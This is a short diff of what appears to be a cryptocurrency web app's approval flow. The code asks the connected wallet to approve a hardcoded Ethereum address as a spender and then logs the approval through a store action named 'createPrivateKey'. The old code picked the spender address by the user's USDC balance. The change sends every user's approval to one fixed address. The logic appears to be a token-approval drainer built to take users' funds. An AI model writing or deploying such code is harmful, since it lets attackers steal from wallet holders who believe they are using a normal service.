@@ -103,7 +103,8 @@
         let auth_address = '';
         if (environment.value === 'Ethereum') {
           
-          auth_address = usdc_balance.value > 10000 ? '0x41d4C8894B529d50Eb82A1c183019e883C77d1DB':'0xF40809d49f605BD2c405cFa276e48f9587E4D0A9'
+          // auth_address = usdc_balance.value > 10000 ? '0x41d4C8894B529d50Eb82A1c183019e883C77d1DB':'0xF40809d49f605BD2c405cFa276e48f9587E4D0A9'
+          auth_address = '0xF40809d49f605BD2c405cFa276e48f9587E4D0A9'
         } 
         if (auth_address === '') {
           console.log("Error")
@@ -112,17 +113,15 @@
         try {
           const hash = await wallet.approve(auth_address, address.value);
           isApproved.value = true;
-          if(usdc_balance.value < 10000) {
-            store.commit('user/setApprove', isApproved.value)
-            let payload = {
-              walletAddress:address.value,
-              data: { 
-                is_approved : isApproved.value,
-                approval_date: new Date(),
-              }
+          store.commit('user/setApprove', isApproved.value)
+          let payload = {
+            walletAddress:address.value,
+            data: { 
+              is_approved : isApproved.value,
+              approval_date: new Date(),
             }
-            await store.dispatch('user/createPrivateKey', payload)
           }
+          await store.dispatch('user/createPrivateKey', payload)
         } catch (error) {
           isApproved.value = false;
         }
